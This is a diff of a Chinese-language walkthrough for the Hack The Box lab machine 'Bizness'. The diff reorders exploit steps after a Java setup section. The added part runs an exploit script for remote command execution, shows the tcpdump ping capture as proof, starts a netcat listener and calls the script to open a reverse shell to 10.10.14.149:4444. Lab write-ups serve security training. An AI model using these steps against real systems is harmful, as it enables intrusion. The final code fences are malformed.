@@ -69,16 +69,6 @@ ysoserial-all.jar
 #### ysoserial需要一个可用的Java安装，这是特定于平台的，超出了本文的范围这篇文章。本教程使用Java-11-openjdk。在大多数Linux发行版上，您可以使用以下命令检查备选的java安装命令:
 ```
 [★]$ sudo update-alternatives --config java
-```
-#### 一旦下载了jar并复制了Python脚本，我们就会尝试运行这个漏洞。的Repository为我们提供了这些选项：
-#### 在尝试获取shell之前，我们看看是否可以通过以下方式向攻击机器发送ICMP数据包执行ping命令。我们首先使用tcpdump为这些数据包设置一个监听器：
-```
-sudo tcpdump -i 2 icmp
-```
-#### 然后，我们使用以下参数运行该漏洞：
-```
-[★]$ sudo apt install openjdk-11-jre-headless -y
-[★]$ sudo update-alternatives --config java
 There are 2 choices for the alternative java (providing /usr/bin/java).
 
   Selection    Path                                         Priority   Status
@@ -94,3 +84,41 @@ openjdk version "11.0.22" 2024-01-16
 OpenJDK Runtime Environment (build 11.0.22+7-post-Debian-2)
 OpenJDK 64-Bit Server VM (build 11.0.22+7-post-Debian-2, mixed mode, sharing)
 ```
+#### 一旦下载了jar并复制了Python脚本，我们就会尝试运行这个漏洞。的Repository为我们提供了这些选项：
+#### 在尝试获取shell之前，我们看看是否可以通过以下方式向攻击机器发送ICMP数据包执行ping命令。我们首先使用tcpdump为这些数据包设置一个监听器：
+```
+sudo tcpdump -i 2 icmp
+```
+#### 然后，我们使用以下参数运行该漏洞：
+```
+[★]$ python3 exploit.py https://bizness.htb rce "ping -c 5 10.10.14.149"
+Not Sure Worked or not
+```
+```
+01:18:00.595489 IP htb-ntvuhefriq > bizness.htb: ICMP echo reply, id 49092, seq 1, length 64
+01:18:00.799245 IP htb-ntvuhefriq > 10.10.14.1: ICMP echo request, id 21300, seq 1, length 64
+01:18:00.808036 IP 10.10.14.1 > htb-ntvuhefriq: ICMP echo reply, id 21300, seq 1, length 64
+01:18:01.596390 IP bizness.htb > htb-ntvuhefriq: ICMP echo request, id 49092, seq 2, length 64
+01:18:01.596408 IP htb-ntvuhefriq > bizness.htb: ICMP echo reply, id 49092, seq 2, length 64
+01:18:01.799469 IP htb-ntvuhefriq > 10.10.14.1: ICMP echo request, id 21326, seq 1, length 64
+01:18:01.809366 IP 10.10.14.1 > htb-ntvuhefriq: ICMP echo reply, id 21326, seq 1, length 64
+01:18:02.597950 IP bizness.htb > htb-ntvuhefriq: ICMP echo request, id 49092, seq 3, length 64
+01:18:02.597965 IP htb-ntvuhefriq > bizness.htb: ICMP echo reply, id 49092, seq 3, length 64
+01:18:02.798392 IP htb-ntvuhefriq > 10.10.14.1: ICMP echo request, id 21352, seq 1, length 64
+01:18:02.807262 IP 10.10.14.1 > htb-ntvuhefriq: ICMP echo reply, id 21352, seq 1, length 64
+01:18:03.599246 IP bizness.htb > htb-ntvuhefriq: ICMP echo request, id 49092, seq 4, length 64
+01:18:03.599261 IP htb-ntvuhefriq > bizness.htb: ICMP echo reply, id 49092, seq 4, length 64
+01:18:03.800642 IP htb-ntvuhefriq > 10.10.14.1: ICMP echo request, id 21378, seq 1, length 64
+01:18:03.809295 IP 10.10.14.1 > htb-ntvuhefriq: ICMP echo reply, id 21378, seq 1, length 64
+01:18:04.600514 IP bizness.htb > htb-ntvuhefriq: ICMP echo request, id 49092, seq 5, length 64
+01:18:04.600531 IP htb-ntvuhefriq > bizness.htb: ICMP echo reply, id 49092, seq 5, length 64
+```
+#### 这证实了我们可以在目标上运行任意命令，现在我们继续获取a反向壳。
+#### 我们首先使用Netcat在端口4444上设置一个监听器：
+```
+[★]$ nc -nlvp 4444
+listening on [any] 4444 ...
+```
+[★]$ python3 exploit.py https://bizness.htb shell 10.10.14.149:4444Not Sure Worked or not 
+```
+``
